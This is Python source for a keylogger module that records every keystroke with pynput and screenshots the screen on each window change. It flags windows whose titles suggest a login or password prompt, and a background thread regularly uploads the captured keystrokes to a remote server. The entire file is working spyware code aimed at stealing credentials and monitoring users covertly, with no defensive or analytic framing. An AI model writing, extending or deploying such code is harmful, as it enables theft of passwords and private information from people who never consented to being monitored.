import time
import os
import pyautogui
from threading import Thread
from pynput import keyboard
from keylogger.log_start import log_keystrokes
from info.config import LOG_FLUSH_INTERVAL
from info.cur_window import get_Window
from datetime import datetime
from info.upld import send_log_to_server
from pathlib import Path
SCREENSHOT_DIR = Path("logs/screenshots")
SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)


LOGIN_KEYWORDS = ["login", "sign in", "log in", "account", "verify", "authentication", "password"]
buffer = []
shift_pressed = False
ctrl_pressed = False
caps_on = False
last_window = None
last_login_window=None

shift_map = {
    '`': '~', '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
    '6': '^', '7': '&', '8': '*', '9': '(', '0': ')', '-': '_',
    '=': '+', '[': '{', ']': '}', '\\': '|', ';': ':', "'": '"',
    ',': '<', '.': '>', '/': '?'
}


def take_screenshot():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"screenshot_{timestamp}.png"
    filepath = SCREENSHOT_DIR / filename 
    pyautogui.screenshot(str(filepath)) 
    return filepath

def handle_key(key):
    global shift_pressed, caps_on
    try:
        char = key.char
        if char is None:
            return None
        if char.isalpha():
            return char.upper() if shift_pressed ^ caps_on else char
        elif shift_pressed and char in shift_map:
            return shift_map[char]
        else:
            return char
    except AttributeError:
        return None

def IsLogin(title: str):
    title = title.lower()
    return any(keyword in title for keyword in LOGIN_KEYWORDS)




def on_press(key):
    global shift_pressed, caps_on, buffer, last_window, ctrl_pressed, last_login_window
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    current_window = get_Window()

    # Check quit combo first:
    if hasattr(key, 'char') and key.char and key.char.lower() == 'q':
        if ctrl_pressed and shift_pressed:
            print("Done Quitting")
            # You can add exit logic here, e.g., sys.exit(0)
            return False  # Stop listener

    # Update modifier key states
    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = True
    elif key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        ctrl_pressed = True
    elif key == keyboard.Key.caps_lock:
        caps_on = not caps_on

    # Window change screenshot + log
    if current_window != last_window:
        take_screenshot()
        last_window = current_window
        log_keystrokes(f"\n[{timestamp}] - {current_window}\n")

    # Login window detection
    if IsLogin(current_window) and current_window != last_login_window:
        log_keystrokes(f"[{timestamp}] Possible Login Info Detected\n")
        last_login_window = current_window

    # Key logging
    if key == keyboard.Key.backspace:
        if buffer:
            buffer.pop()
    elif key == keyboard.Key.space:
        buffer.append(' ')
    elif key == keyboard.Key.enter:
        buffer.append('\n')
    else:
        char = handle_key(key)
        if char:
            buffer.append(char)


def on_release(key):
    global shift_pressed, ctrl_pressed
    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = False
    elif key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        ctrl_pressed = False



def flush_buffer():
    global buffer,last_window
    while True:
        time.sleep(LOG_FLUSH_INTERVAL)
        if buffer:
            logsbuff="".join(buffer)            
            log_keystrokes(logsbuff) #Logs
            send_log_to_server(logsbuff) #Flask
            buffer.clear()

            
def start_listener():
    flush_thread = Thread(target=flush_buffer, daemon=True)
    flush_thread.start()

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join() 